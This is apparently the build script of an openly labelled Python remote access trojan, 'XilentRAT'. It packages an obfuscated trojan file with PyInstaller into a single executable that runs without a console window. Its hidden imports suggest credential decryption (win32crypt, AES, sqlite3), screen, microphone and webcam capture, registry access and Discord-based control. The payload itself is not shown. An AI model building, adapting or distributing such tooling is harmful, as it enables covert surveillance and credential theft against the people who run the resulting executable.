# BUILDER -> python3 setupBot.py build

from setuptools import setup
import subprocess

import subprocess

def buildPyinstaller():
    pyinstaller_command = [
        'python3', '-m', 'PyInstaller',
        '--hidden-import=discord',
        '--hidden-import=os',
        '--hidden-import=platform',
        '--hidden-import=socket',
        '--hidden-import=psutil',
        '--hidden-import=requests',
        '--hidden-import=subprocess',
        '--hidden-import=pyautogui',
        '--hidden-import=pyaudio',
        '--hidden-import=wave',
        '--hidden-import=base64',
        '--hidden-import=shutil',
        '--hidden-import=json',
        '--hidden-import=win32crypt',
        '--hidden-import=sqlite3',
        '--hidden-import=cv2',
        '--hidden-import=cypes',
        '--hidden-import=pyttsx3',
        '--hidden-import=time',
        '--hidden-import=numpy',
        '--hidden-import=winreg',
        '--hidden-import=sys',
        '--hidden-import=datetime',
        '--hidden-import=Cryptodome.Cipher.AES',
        '--hidden-import=tkinter.filedialog',
        '--hidden-import=tkinter',
        '--hidden-import=ttkthemes',
        '--hidden-import=ttkbootstrap',  
        '--hidden-import=tkinter.messagebox',
        '--hidden-import=random',
        '--hidden-import=threading',
        '--hidden-import=py7zr',
        '--add-data', '../bot/*;bot',  
        '--add-data', '../modules/*;modules',  
        '--onefile', '--noconsole',  
        '--icon=logo.ico',
        '../crypted_XilentRAT.py'
    ]
    
    subprocess.run(pyinstaller_command)



if __name__ == "__main__":
    buildPyinstaller()

setup(
    name="XilentRAT",
    version="1.2",
    author='R3LI4NT',
    description="Python Remote Access Trojan (RAT)",
)
